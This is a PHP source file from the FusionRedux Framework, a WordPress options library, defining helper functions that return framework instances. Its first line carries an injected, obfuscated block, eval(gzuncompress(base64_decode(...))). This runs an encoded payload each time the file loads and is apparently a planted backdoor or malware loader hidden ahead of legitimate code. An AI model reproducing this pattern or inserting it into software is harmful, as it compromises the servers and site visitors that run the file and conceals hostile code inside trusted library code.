<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

	/**
	 * FusionReduxFrameworkInstances Functions
	 *
	 * @package     FusionRedux_Framework
	 * @subpackage  Core
	 */
	if ( ! function_exists( 'get_fusionredux_instance' ) ) {

		/**
		 * Retreive an instance of FusionReduxFramework
		 *
		 * @param  string $opt_name the defined opt_name as passed in $args
		 *
		 * @return object                FusionReduxFramework
		 */
		function get_fusionredux_instance( $opt_name ) {
			return FusionReduxFrameworkInstances::get_instance( $opt_name );
		}
	}

	if ( ! function_exists( 'get_all_fusionredux_instances' ) ) {

		/**
		 * Retreive all instances of FusionReduxFramework
		 * as an associative array.
		 *
		 * @return array        format ['opt_name' => $FusionReduxFramework]
		 */
		function get_all_fusionredux_instances() {
			return FusionReduxFrameworkInstances::get_all_instances();
		}
	}
